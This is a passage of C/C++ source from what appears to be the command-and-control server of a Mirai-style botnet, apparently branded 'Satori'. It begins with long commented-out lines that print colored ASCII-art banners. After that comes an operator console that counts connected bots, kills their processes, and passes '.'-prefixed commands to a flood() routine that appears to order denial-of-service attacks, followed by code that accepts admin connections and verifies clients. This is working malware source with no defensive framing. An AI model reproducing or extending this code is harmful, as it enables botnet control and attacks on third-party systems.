    		//send(fd, "⠀⠀⠀⠀\e[38;5;131m⢇\e[38;5;95m⣐\e[38;5;254m⣼\e[38;5;253m⣿\e[38;5;245m⣿\e[38;5;248m⣿⣿\e[38;5;253m⣿\e[38;5;251m⣿\e[38;5;7m⣿\e[38;5;245m⣿\e[38;5;95m⡋\e[38;5;250m⣾\e[38;5;59m⠁⠀\e[38;5;124m⠤\e[38;5;254m⠰\e[38;5;251m⠾⣮\e[38;5;253m⣻\e[38;5;255m⣿\e[38;5;252m⣿⣿\e[38;5;145m⣿\e[38;5;248m⣿\e[38;5;250m⣿\e[38;5;139m⣿\e[38;5;95m⡽⣄\e[38;5;89m⠠⣀⣶⡿\e[38;5;52m⡀⠀⠀\e[38;5;125m⠃\e[38;5;89m⡄\e[38;5;125m⠹⣿⣿\e[38;5;89m⡀⣕\e[38;5;53m⠂⠀⠀⠀⠀\033[0m\r\n", strlen("⠀⠀⠀⠀\e[38;5;131m⢇\e[38;5;95m⣐\e[38;5;254m⣼\e[38;5;253m⣿\e[38;5;245m⣿\e[38;5;248m⣿⣿\e[38;5;253m⣿\e[38;5;251m⣿\e[38;5;7m⣿\e[38;5;245m⣿\e[38;5;95m⡋\e[38;5;250m⣾\e[38;5;59m⠁⠀\e[38;5;124m⠤\e[38;5;254m⠰\e[38;5;251m⠾⣮\e[38;5;253m⣻\e[38;5;255m⣿\e[38;5;252m⣿⣿\e[38;5;145m⣿\e[38;5;248m⣿\e[38;5;250m⣿\e[38;5;139m⣿\e[38;5;95m⡽⣄\e[38;5;89m⠠⣀⣶⡿\e[38;5;52m⡀⠀⠀\e[38;5;125m⠃\e[38;5;89m⡄\e[38;5;125m⠹⣿⣿\e[38;5;89m⡀⣕\e[38;5;53m⠂⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "⠀⠀⠀\e[38;5;249m⢀\e[38;5;253m⣾\e[38;5;188m⣿\e[38;5;224m⣿\e[38;5;245m⢿\e[38;5;248m⣿\e[38;5;7m⣿\e[38;5;251m⣿\e[38;5;188m⣿\e[38;5;253m⣿\e[38;5;249m⣿\e[38;5;248m⣟⣷\e[38;5;188m⣿\e[38;5;252m⣄\e[38;5;88m⢸\e[38;5;124m⣺⠧\e[38;5;145m⢰\e[38;5;15m⣿⣿⣿\e[38;5;255m⣿\e[38;5;247m⣿\e[38;5;224m⣿\e[38;5;252m⣿\e[38;5;247m⣿\e[38;5;249m⣿\e[38;5;181m⣿\e[38;5;89m⣽⡄⣷⢾⣷⡇⠀⡀⠀⠀⢇⡘\e[38;5;125m⣿⡇\e[38;5;89m⢹\e[38;5;102m⠁⠀⠀⠀⠀\033[0m\r\n", strlen("⠀⠀⠀\e[38;5;249m⢀\e[38;5;253m⣾\e[38;5;188m⣿\e[38;5;224m⣿\e[38;5;245m⢿\e[38;5;248m⣿\e[38;5;7m⣿\e[38;5;251m⣿\e[38;5;188m⣿\e[38;5;253m⣿\e[38;5;249m⣿\e[38;5;248m⣟⣷\e[38;5;188m⣿\e[38;5;252m⣄\e[38;5;88m⢸\e[38;5;124m⣺⠧\e[38;5;145m⢰\e[38;5;15m⣿⣿⣿\e[38;5;255m⣿\e[38;5;247m⣿\e[38;5;224m⣿\e[38;5;252m⣿\e[38;5;247m⣿\e[38;5;249m⣿\e[38;5;181m⣿\e[38;5;89m⣽⡄⣷⢾⣷⡇⠀⡀⠀⠀⢇⡘\e[38;5;125m⣿⡇\e[38;5;89m⢹\e[38;5;102m⠁⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "⠀⠀\e[38;5;250m⣠\e[38;5;255m⣾\e[38;5;253m⣿\e[38;5;255m⣿\e[38;5;139m⠏\e[38;5;248m⢸\e[38;5;253m⣿\e[38;5;251m⣿\e[38;5;252m⣿\e[38;5;224m⣿⣿\e[38;5;250m⣿\e[38;5;247m⣿\e[38;5;139m⣿\e[38;5;252m⣿\e[38;5;253m⣭\e[38;5;188m⣷\e[38;5;253m⣲⣾\e[38;5;255m⣿⣿\e[38;5;15m⣿⣿⣿\e[38;5;224m⣿\e[38;5;182m⣿\e[38;5;224m⣿\e[38;5;181m⣿\e[38;5;224m⣿⣿\e[38;5;175m⣿\e[38;5;89m⣳\e[38;5;88m⠸\e[38;5;89m⡿\e[38;5;125m⣿⣿⠀\e[38;5;89m⣷⢸⣆⠈⠟⠔\e[38;5;125m⣷⠀⠀⠀⠀⠀⠀\033[0m\r\n", strlen("⠀⠀\e[38;5;250m⣠\e[38;5;255m⣾\e[38;5;253m⣿\e[38;5;255m⣿\e[38;5;139m⠏\e[38;5;248m⢸\e[38;5;253m⣿\e[38;5;251m⣿\e[38;5;252m⣿\e[38;5;224m⣿⣿\e[38;5;250m⣿\e[38;5;247m⣿\e[38;5;139m⣿\e[38;5;252m⣿\e[38;5;253m⣭\e[38;5;188m⣷\e[38;5;253m⣲⣾\e[38;5;255m⣿⣿\e[38;5;15m⣿⣿⣿\e[38;5;224m⣿\e[38;5;182m⣿\e[38;5;224m⣿\e[38;5;181m⣿\e[38;5;224m⣿⣿\e[38;5;175m⣿\e[38;5;89m⣳\e[38;5;88m⠸\e[38;5;89m⡿\e[38;5;125m⣿⣿⠀\e[38;5;89m⣷⢸⣆⠈⠟⠔\e[38;5;125m⣷⠀⠀⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "⠀\e[38;5;246m⣰\e[38;5;255m⣿\e[38;5;253m⣿\e[38;5;255m⣿\e[38;5;145m⠏⠀\e[38;5;7m⣿\e[38;5;252m⣿\e[38;5;254m⣿\e[38;5;224m⣿\e[38;5;252m⣿⣿\e[38;5;7m⣿\e[38;5;246m⣿\e[38;5;247m⣿\e[38;5;255m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;254m⣿\e[38;5;224m⣿⣿⣿⣿⣿⣿\e[38;5;138m⣷\e[38;5;89m⡃⢿\e[38;5;125m⣿⣿⡆\e[38;5;89m⠸⢸⣿⣷⡈⢻⠔\e[38;5;125m⢧\e[38;5;52m⡀⠀⠀⠀⠀\033[0m\r\n", strlen("⠀\e[38;5;246m⣰\e[38;5;255m⣿\e[38;5;253m⣿\e[38;5;255m⣿\e[38;5;145m⠏⠀\e[38;5;7m⣿\e[38;5;252m⣿\e[38;5;254m⣿\e[38;5;224m⣿\e[38;5;252m⣿⣿\e[38;5;7m⣿\e[38;5;246m⣿\e[38;5;247m⣿\e[38;5;255m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;254m⣿\e[38;5;224m⣿⣿⣿⣿⣿⣿\e[38;5;138m⣷\e[38;5;89m⡃⢿\e[38;5;125m⣿⣿⡆\e[38;5;89m⠸⢸⣿⣷⡈⢻⠔\e[38;5;125m⢧\e[38;5;52m⡀⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "\e[38;5;252m⣰\e[38;5;253m⣿⣿\e[38;5;255m⣿\e[38;5;188m⣿\e[38;5;89m⢰\e[38;5;132m⣄\e[38;5;255m⣿⣿\e[38;5;253m⣿\e[38;5;255m⣿\e[38;5;254m⣿\e[38;5;250m⣿\e[38;5;188m⣿\e[38;5;243m⣿\e[38;5;245m⢾\e[38;5;254m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;253m⣿\e[38;5;255m⣿\e[38;5;15m⣿⣿⣿⣿\e[38;5;255m⣿\e[38;5;224m⣿\e[38;5;139m⣷\e[38;5;95m⣸\e[38;5;89m⣿\e[38;5;125m⣿⣿\e[38;5;237m⠘\e[38;5;89m⣺⣿⣿⡃⠘\e[38;5;125m⠫\e[38;5;89m⠎\e[38;5;125m⣷⠀⠀⠀⠀\033[0m\r\n", strlen("\e[38;5;252m⣰\e[38;5;253m⣿⣿\e[38;5;255m⣿\e[38;5;188m⣿\e[38;5;89m⢰\e[38;5;132m⣄\e[38;5;255m⣿⣿\e[38;5;253m⣿\e[38;5;255m⣿\e[38;5;254m⣿\e[38;5;250m⣿\e[38;5;188m⣿\e[38;5;243m⣿\e[38;5;245m⢾\e[38;5;254m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;253m⣿\e[38;5;255m⣿\e[38;5;15m⣿⣿⣿⣿\e[38;5;255m⣿\e[38;5;224m⣿\e[38;5;139m⣷\e[38;5;95m⣸\e[38;5;89m⣿\e[38;5;125m⣿⣿\e[38;5;237m⠘\e[38;5;89m⣺⣿⣿⡃⠘\e[38;5;125m⠫\e[38;5;89m⠎\e[38;5;125m⣷⠀⠀⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "\e[38;5;251m⢿\e[38;5;254m⣿⣿\e[38;5;255m⣿\e[38;5;138m⡏\e[38;5;174m⢨\e[38;5;254m⣿\e[38;5;224m⣿\e[38;5;145m⣿\e[38;5;254m⣿\e[38;5;15m⣿\e[38;5;253m⣿\e[38;5;248m⣿\e[38;5;188m⣿\e[38;5;8m⡿\e[38;5;60m⣿\e[38;5;248m⣾\e[38;5;253m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;255m⣿\e[38;5;224m⣿\e[38;5;181m⣷\e[38;5;95m⢿\e[38;5;125m⣿⣿⣇\e[38;5;89m⡏\e[38;5;125m⢿⣿\e[38;5;89m⣿⠀⢟⣣\e[38;5;125m⣸⣧\e[38;5;249m⡄⠀⠀\033[0m\r\n", strlen("\e[38;5;251m⢿\e[38;5;254m⣿⣿\e[38;5;255m⣿\e[38;5;138m⡏\e[38;5;174m⢨\e[38;5;254m⣿\e[38;5;224m⣿\e[38;5;145m⣿\e[38;5;254m⣿\e[38;5;15m⣿\e[38;5;253m⣿\e[38;5;248m⣿\e[38;5;188m⣿\e[38;5;8m⡿\e[38;5;60m⣿\e[38;5;248m⣾\e[38;5;253m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;255m⣿\e[38;5;224m⣿\e[38;5;181m⣷\e[38;5;95m⢿\e[38;5;125m⣿⣿⣇\e[38;5;89m⡏\e[38;5;125m⢿⣿\e[38;5;89m⣿⠀⢟⣣\e[38;5;125m⣸⣧\e[38;5;249m⡄⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "\e[38;5;246m⠸\e[38;5;254m⣿\e[38;5;188m⣿\e[38;5;255m⣿⣿⣿\e[38;5;224m⣿\e[38;5;138m⠇\e[38;5;89m⣸\e[38;5;145m⠿\e[38;5;255m⣿\e[38;5;188m⣿\e[38;5;247m⣿\e[38;5;249m⣿\e[38;5;250m⣿\e[38;5;102m⣿\e[38;5;103m⣿\e[38;5;243m⣿\e[38;5;248m⣿\e[38;5;254m⣿\e[38;5;15m⣿⣿⣿⣿⣿\e[38;5;254m⣿⣿\e[38;5;188m⣿\e[38;5;15m⣿⣿⣿⣿⣿\e[38;5;255m⣿\e[38;5;182m⣿\e[38;5;96m⣻\e[38;5;246m⡽\e[38;5;188m⣿\e[38;5;252m⣿\e[38;5;181m⣿⣶\e[38;5;175m⣼\e[38;5;131m⣿⣿\e[38;5;181m⣄\e[38;5;89m⠿\e[38;5;125m⢖\e[38;5;89m⡃\e[38;5;125m⣿\e[38;5;59m⢠⠀⠀\033[0m\r\n", strlen("\e[38;5;246m⠸\e[38;5;254m⣿\e[38;5;188m⣿\e[38;5;255m⣿⣿⣿\e[38;5;224m⣿\e[38;5;138m⠇\e[38;5;89m⣸\e[38;5;145m⠿\e[38;5;255m⣿\e[38;5;188m⣿\e[38;5;247m⣿\e[38;5;249m⣿\e[38;5;250m⣿\e[38;5;102m⣿\e[38;5;103m⣿\e[38;5;243m⣿\e[38;5;248m⣿\e[38;5;254m⣿\e[38;5;15m⣿⣿⣿⣿⣿\e[38;5;254m⣿⣿\e[38;5;188m⣿\e[38;5;15m⣿⣿⣿⣿⣿\e[38;5;255m⣿\e[38;5;182m⣿\e[38;5;96m⣻\e[38;5;246m⡽\e[38;5;188m⣿\e[38;5;252m⣿\e[38;5;181m⣿⣶\e[38;5;175m⣼\e[38;5;131m⣿⣿\e[38;5;181m⣄\e[38;5;89m⠿\e[38;5;125m⢖\e[38;5;89m⡃\e[38;5;125m⣿\e[38;5;59m⢠⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "⠀\e[38;5;254m⢿\e[38;5;15m⣿\e[38;5;255m⣿\e[38;5;15m⣿\e[38;5;255m⣿\e[38;5;224m⣿⠀\e[38;5;89m⠿\e[38;5;125m⢸\e[38;5;132m⡿\e[38;5;254m⣿\e[38;5;247m⣿\e[38;5;252m⣿\e[38;5;249m⣿\e[38;5;245m⣿⣿\e[38;5;243m⣿\e[38;5;60m⣿⣿\e[38;5;246m⢟\e[38;5;252m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;255m⣿⡿\e[38;5;249m⣿\e[38;5;252m⢹\e[38;5;250m⣽\e[38;5;246m⣻\e[38;5;247m⣿\e[38;5;96m⣌\e[38;5;181m⣻\e[38;5;255m⢿⣿\e[38;5;254m⣿\e[38;5;255m⣿⣿\e[38;5;254m⣿\e[38;5;253m⣷\e[38;5;132m⡴\e[38;5;89m⠇\e[38;5;125m⣿\e[38;5;89m⢸⠀⠀\033[0m\r\n", strlen("⠀\e[38;5;254m⢿\e[38;5;15m⣿\e[38;5;255m⣿\e[38;5;15m⣿\e[38;5;255m⣿\e[38;5;224m⣿⠀\e[38;5;89m⠿\e[38;5;125m⢸\e[38;5;132m⡿\e[38;5;254m⣿\e[38;5;247m⣿\e[38;5;252m⣿\e[38;5;249m⣿\e[38;5;245m⣿⣿\e[38;5;243m⣿\e[38;5;60m⣿⣿\e[38;5;246m⢟\e[38;5;252m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;255m⣿⡿\e[38;5;249m⣿\e[38;5;252m⢹\e[38;5;250m⣽\e[38;5;246m⣻\e[38;5;247m⣿\e[38;5;96m⣌\e[38;5;181m⣻\e[38;5;255m⢿⣿\e[38;5;254m⣿\e[38;5;255m⣿⣿\e[38;5;254m⣿\e[38;5;253m⣷\e[38;5;132m⡴\e[38;5;89m⠇\e[38;5;125m⣿\e[38;5;89m⢸⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "⠀\e[38;5;251m⣻\e[38;5;15m⣿⣿⣿\e[38;5;255m⣿\e[38;5;182m⣿⠀\e[38;5;89m⡘⢯\e[38;5;125m⣻\e[38;5;131m⣿\e[38;5;245m⣿⣿\e[38;5;188m⣿\e[38;5;245m⣿⣿\e[38;5;102m⣿\e[38;5;60m⣿\e[38;5;66m⣿\e[38;5;95m⣾\e[38;5;138m⣿⣿\e[38;5;248m⣿\e[38;5;251m⣿\e[38;5;254m⣿\e[38;5;255m⣿⣿\e[38;5;252m⣿\e[38;5;248m⣿\e[38;5;96m⣿\e[38;5;138m⣿\e[38;5;139m⣿\e[38;5;243m⣿\e[38;5;250m⣿\e[38;5;254m⣿\e[38;5;255m⣿\e[38;5;252m⣿\e[38;5;224m⣷\e[38;5;252m⣴\e[38;5;7m⣭\e[38;5;251m⣹\e[38;5;253m⡻\e[38;5;255m⣿⣿\e[38;5;254m⣿⣿\e[38;5;255m⣆\e[38;5;125m⡟\e[38;5;89m⡃⠀⠀\033[0m\r\n", strlen("⠀\e[38;5;251m⣻\e[38;5;15m⣿⣿⣿\e[38;5;255m⣿\e[38;5;182m⣿⠀\e[38;5;89m⡘⢯\e[38;5;125m⣻\e[38;5;131m⣿\e[38;5;245m⣿⣿\e[38;5;188m⣿\e[38;5;245m⣿⣿\e[38;5;102m⣿\e[38;5;60m⣿\e[38;5;66m⣿\e[38;5;95m⣾\e[38;5;138m⣿⣿\e[38;5;248m⣿\e[38;5;251m⣿\e[38;5;254m⣿\e[38;5;255m⣿⣿\e[38;5;252m⣿\e[38;5;248m⣿\e[38;5;96m⣿\e[38;5;138m⣿\e[38;5;139m⣿\e[38;5;243m⣿\e[38;5;250m⣿\e[38;5;254m⣿\e[38;5;255m⣿\e[38;5;252m⣿\e[38;5;224m⣷\e[38;5;252m⣴\e[38;5;7m⣭\e[38;5;251m⣹\e[38;5;253m⡻\e[38;5;255m⣿⣿\e[38;5;254m⣿⣿\e[38;5;255m⣆\e[38;5;125m⡟\e[38;5;89m⡃⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "\e[38;5;95m⢹\e[38;5;89m⡏\e[38;5;15m⣿⣿⣿\e[38;5;224m⣿\e[38;5;181m⣿⠀\e[38;5;89m⠻⣆\e[38;5;125m⠹\e[38;5;89m⣿\e[38;5;245m⣿\e[38;5;243m⣿\e[38;5;248m⣿\e[38;5;249m⣿\e[38;5;246m⣿\e[38;5;247m⣿\e[38;5;60m⣿\e[38;5;66m⣿\e[38;5;248m⣿\e[38;5;255m⣿⣿\e[38;5;253m⣿\e[38;5;181m⣿\e[38;5;145m⣿\e[38;5;96m⣿\e[38;5;138m⣿\e[38;5;181m⣿\e[38;5;252m⣿\e[38;5;224m⣿⣿⣿\e[38;5;239m⣿\e[38;5;102m⣿\e[38;5;249m⣿\e[38;5;103m⣿\e[38;5;247m⣿\e[38;5;255m⠉\e[38;5;188m⠛\e[38;5;255m⠻⢿⣿\e[38;5;251m⣷\e[38;5;252m⣿\e[38;5;255m⣿\e[38;5;254m⣿⣿\e[38;5;181m⣯\e[38;5;251m⡁⠀⠀\033[0m\r\n", strlen("\e[38;5;95m⢹\e[38;5;89m⡏\e[38;5;15m⣿⣿⣿\e[38;5;224m⣿\e[38;5;181m⣿⠀\e[38;5;89m⠻⣆\e[38;5;125m⠹\e[38;5;89m⣿\e[38;5;245m⣿\e[38;5;243m⣿\e[38;5;248m⣿\e[38;5;249m⣿\e[38;5;246m⣿\e[38;5;247m⣿\e[38;5;60m⣿\e[38;5;66m⣿\e[38;5;248m⣿\e[38;5;255m⣿⣿\e[38;5;253m⣿\e[38;5;181m⣿\e[38;5;145m⣿\e[38;5;96m⣿\e[38;5;138m⣿\e[38;5;181m⣿\e[38;5;252m⣿\e[38;5;224m⣿⣿⣿\e[38;5;239m⣿\e[38;5;102m⣿\e[38;5;249m⣿\e[38;5;103m⣿\e[38;5;247m⣿\e[38;5;255m⠉\e[38;5;188m⠛\e[38;5;255m⠻⢿⣿\e[38;5;251m⣷\e[38;5;252m⣿\e[38;5;255m⣿\e[38;5;254m⣿⣿\e[38;5;181m⣯\e[38;5;251m⡁⠀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "\e[38;5;245m⠠\e[38;5;125m⢿\e[38;5;181m⣿\e[38;5;15m⣿⣿\e[38;5;182m⣿\e[38;5;181m⣿\e[38;5;89m⢰⡆\e[38;5;88m⠘\e[38;5;125m⠆\e[38;5;89m⣿\e[38;5;246m⣿\e[38;5;243m⣿⣿\e[38;5;254m⣿\e[38;5;247m⡿\e[38;5;249m⣿\e[38;5;102m⣿\e[38;5;60m⣿\e[38;5;248m⣿\e[38;5;15m⣿⣿⣿⣿⣿\e[38;5;255m⣿\e[38;5;15m⣿⣿\e[38;5;255m⣿⣿\e[38;5;224m⣿\e[38;5;182m⣿\e[38;5;242m⣯\e[38;5;254m⣿\e[38;5;253m⣿\e[38;5;248m⣿\e[38;5;103m⣿\e[38;5;242m⡆\e[38;5;89m⢤⡄⠀\e[38;5;224m⠙\e[38;5;254m⣿\e[38;5;255m⣿\e[38;5;253m⣿\e[38;5;254m⣿⣿\e[38;5;255m⣿\e[38;5;254m⣿\e[38;5;224m⡀⠀\033[0m\r\n", strlen("\e[38;5;245m⠠\e[38;5;125m⢿\e[38;5;181m⣿\e[38;5;15m⣿⣿\e[38;5;182m⣿\e[38;5;181m⣿\e[38;5;89m⢰⡆\e[38;5;88m⠘\e[38;5;125m⠆\e[38;5;89m⣿\e[38;5;246m⣿\e[38;5;243m⣿⣿\e[38;5;254m⣿\e[38;5;247m⡿\e[38;5;249m⣿\e[38;5;102m⣿\e[38;5;60m⣿\e[38;5;248m⣿\e[38;5;15m⣿⣿⣿⣿⣿\e[38;5;255m⣿\e[38;5;15m⣿⣿\e[38;5;255m⣿⣿\e[38;5;224m⣿\e[38;5;182m⣿\e[38;5;242m⣯\e[38;5;254m⣿\e[38;5;253m⣿\e[38;5;248m⣿\e[38;5;103m⣿\e[38;5;242m⡆\e[38;5;89m⢤⡄⠀\e[38;5;224m⠙\e[38;5;254m⣿\e[38;5;255m⣿\e[38;5;253m⣿\e[38;5;254m⣿⣿\e[38;5;255m⣿\e[38;5;254m⣿\e[38;5;224m⡀⠀\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "\e[38;5;132m⢠\e[38;5;89m⡜\e[38;5;125m⢿\e[38;5;181m⣻\e[38;5;255m⣿\e[38;5;181m⣿\e[38;5;132m⣏\e[38;5;89m⣜⡛⠀⢸⠟\e[38;5;251m⣿\e[38;5;8m⣿\e[38;5;240m⣿\e[38;5;248m⣿\e[38;5;255m⣿\e[38;5;251m⣽\e[38;5;255m⣿\e[38;5;15m⣿⣿⣿\e[38;5;253m⣿\e[38;5;15m⣿\e[38;5;253m⣿⣿\e[38;5;255m⣿\e[38;5;15m⣿\e[38;5;254m⣿⣿\e[38;5;255m⣿\e[38;5;188m⣿\e[38;5;251m⣿\e[38;5;253m⣿\e[38;5;254m⣿\e[38;5;252m⣿⣿\e[38;5;188m⣯\e[38;5;138m⣾\e[38;5;131m⣿⣆\e[38;5;89m⠷⠀\e[38;5;138m⠘\e[38;5;254m⣿\e[38;5;15m⣿\e[38;5;255m⣿\e[38;5;254m⣿\e[38;5;255m⣿\e[38;5;181m⣿\e[38;5;125m⣿\e[38;5;95m⡂\033[0m\r\n", strlen("\e[38;5;132m⢠\e[38;5;89m⡜\e[38;5;125m⢿\e[38;5;181m⣻\e[38;5;255m⣿\e[38;5;181m⣿\e[38;5;132m⣏\e[38;5;89m⣜⡛⠀⢸⠟\e[38;5;251m⣿\e[38;5;8m⣿\e[38;5;240m⣿\e[38;5;248m⣿\e[38;5;255m⣿\e[38;5;251m⣽\e[38;5;255m⣿\e[38;5;15m⣿⣿⣿\e[38;5;253m⣿\e[38;5;15m⣿\e[38;5;253m⣿⣿\e[38;5;255m⣿\e[38;5;15m⣿\e[38;5;254m⣿⣿\e[38;5;255m⣿\e[38;5;188m⣿\e[38;5;251m⣿\e[38;5;253m⣿\e[38;5;254m⣿\e[38;5;252m⣿⣿\e[38;5;188m⣯\e[38;5;138m⣾\e[38;5;131m⣿⣆\e[38;5;89m⠷⠀\e[38;5;138m⠘\e[38;5;254m⣿\e[38;5;15m⣿\e[38;5;255m⣿\e[38;5;254m⣿\e[38;5;255m⣿\e[38;5;181m⣿\e[38;5;125m⣿\e[38;5;95m⡂\033[0m\r\n"), MSG_NOSIGNAL);
    		//send(fd, "\e[38;5;131m⢹\e[38;5;125m⣿\e[38;5;89m⡌⢻\e[38;5;174m⠝\e[38;5;139m⡿\e[38;5;89m⣸⣇⠃⠀\e[38;5;125m⣼\e[38;5;89m⢨\e[38;5;242m⠙\e[38;5;95m⣿\e[38;5;242m⣿\e[38;5;246m⣿\e[38;5;15m⣿\e[38;5;254m⣿\e[38;5;249m⣿\e[38;5;254m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;254m⣿\e[38;5;253m⣿\e[38;5;188m⣿\e[38;5;255m⣿\e[38;5;254m⣿\e[38;5;251m⣿⡟\e[38;5;249m⠙\e[38;5;252m⡛\e[38;5;255m⠿\e[38;5;15m⣿\e[38;5;253m⣿\e[38;5;248m⣦\e[38;5;239m⡰\e[38;5;95m⠼\e[38;5;255m⣿\e[38;5;15m⣿⣿\e[38;5;224m⣿\e[38;5;125m⣿\e[38;5;124m⢿\e[38;5;125m⡇\033[0m\r\n", strlen("\e[38;5;131m⢹\e[38;5;125m⣿\e[38;5;89m⡌⢻\e[38;5;174m⠝\e[38;5;139m⡿\e[38;5;89m⣸⣇⠃⠀\e[38;5;125m⣼\e[38;5;89m⢨\e[38;5;242m⠙\e[38;5;95m⣿\e[38;5;242m⣿\e[38;5;246m⣿\e[38;5;15m⣿\e[38;5;254m⣿\e[38;5;249m⣿\e[38;5;254m⣿\e[38;5;15m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\e[38;5;254m⣿\e[38;5;253m⣿\e[38;5;188m⣿\e[38;5;255m⣿\e[38;5;254m⣿\e[38;5;251m⣿⡟\e[38;5;249m⠙\e[38;5;252m⡛\e[38;5;255m⠿\e[38;5;15m⣿\e[38;5;253m⣿\e[38;5;248m⣦\e[38;5;239m⡰\e[38;5;95m⠼\e[38;5;255m⣿\e[38;5;15m⣿⣿\e[38;5;224m⣿\e[38;5;125m⣿\e[38;5;124m⢿\e[38;5;125m⡇\033[0m\r\n"), MSG_NOSIGNAL);


/*
            sprintf(banner1,  "\033[38;5;145m███████╗ █████╗ ████████╗ ██████╗ ██████╗ ██╗\r\n");
			sprintf(banner2,  "\033[38;5;145m██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗██║\r\n");
			sprintf(banner3,  "\033[38;5;145m███████╗███████║   ██║   ██║   ██║██████╔╝██║\r\n");
			sprintf(banner4,  "\033[38;5;145m╚════██║██╔══██║   ██║   ██║   ██║██╔══██╗██║\r\n");
			sprintf(banner5,  "\033[38;5;145m███████║██║  ██║   ██║   ╚██████╔╝██║  ██║██║\r\n");
			sprintf(banner6,  "\033[38;5;145m╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝\r\n");
     
            send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
            send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
            send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
            send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
            send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
            send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
*/

			send(fd, "goldfishgang!\r\n", 15, MSG_NOSIGNAL);
            continue;
        }
        if(data == "cls")
        {
        	send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
            std::stringstream cls_stream;
            cls_stream << "\r\033[37;1m" << login.banner;
            cls_stream << "\r\n";
            send(fd, cls_stream.str().c_str(), cls_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }
        if(data == "wipe")
        {
        	send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
            continue;
        }
        if(data == "botkill")
        {
        	send(fd, "\033[37;1mKilling all current running processes\033[38;5;220m!\r\n", strlen("\033[37;1mKilling all current running processes\033[38;5;220m!\r\n"), MSG_NOSIGNAL);
        	kill_self(&process);
        	continue;
        }
        if(data == "bots")
        {
            std::stringstream count_stream;
            count = client_count(login.max_clients);
            count_stream << "\033[37;1mConnections \033[38;5;220m[\033[37;1m" << count;
            count_stream << "\033[38;5;220m]\r\n";
            send(fd, count_stream.str().c_str(), count_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if((data == "botcount" || data == "stats"))
        {
            std::map<std::string, int> stats;
            std::map<std::string, int>::iterator stats_iterator;
            std::stringstream stats_stream;
            std::stringstream total_stream;
            stats = statistics();
            if(stats.empty())
            {
                send(fd, "\033[37;1mNo clients connected to view stats\033[38;5;220m!\r\n", strlen("\033[37;1mNo clients connected to view stats\033[38;5;220m!\r\n"), MSG_NOSIGNAL);
                continue;
            }
            for(stats_iterator = stats.begin(); stats_iterator != stats.end(); stats_iterator++)
            {
                stats_stream << "\033[37;1m" << stats_iterator->first << "\033[38;5;220m: \033[37;1m" << stats_iterator->second << "\r\n";
            }
            send(fd, stats_stream.str().c_str(), stats_stream.str().length(), MSG_NOSIGNAL);
            count = client_count(login.max_clients);
            total_stream << "\033[37;1mTotal\033[38;5;220m: \033[37;1m" << count << "\r\n";
            send(fd, total_stream.str().c_str(), total_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }
        if(count == 0)
        {
            //send(fd, "\033[37;1mNo clients connected to command\033[37;1m!\r\n", strlen("\033[37;1mNo clients connected to command\033[37;1m!\r\n"), MSG_NOSIGNAL);
            continue;
        }
        process.buf = data;
        process.buf_len = data.length();
        process.fd = fd;
        process.ptr = &login;
        process.count = login.max_clients;
        if(data[0] == '.')
        {
            if(!parse_count(&process))
            {
                send(fd, "\033[37;1mInvalid count specified\033[37;1m!\r\n", strlen("\033[37;1mInvalid count specified\033[37;1m!\r\n"), MSG_NOSIGNAL);
                continue;
            }
            process.buf = process.f;
        }
        ptr = command_process(&process);
        if(!ptr)
        {
            continue;
        }
        flood(ptr, &process);
        free(ptr->buf);
        free(ptr);
    }
    pthread_cancel(counter);
    close(fd);
    pthread_exit(0);
}

static void accept_admin_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    pthread_t thread;
    struct thread_data tdata;
    pthread_barrier_t barrier;
    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
    {
        return;
    }
    tdata.fd = fd;
    pthread_barrier_init(&barrier, NULL, 2);
    tdata.barrier = &barrier;
    tdata.admin_thread = &thread;
    pthread_create(&thread, NULL, admin, (void *)&tdata);
    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);
    return;
}

static void verify_client(struct epoll_event *es, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;
    uint16_t len = 0;
    char *buf;
    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
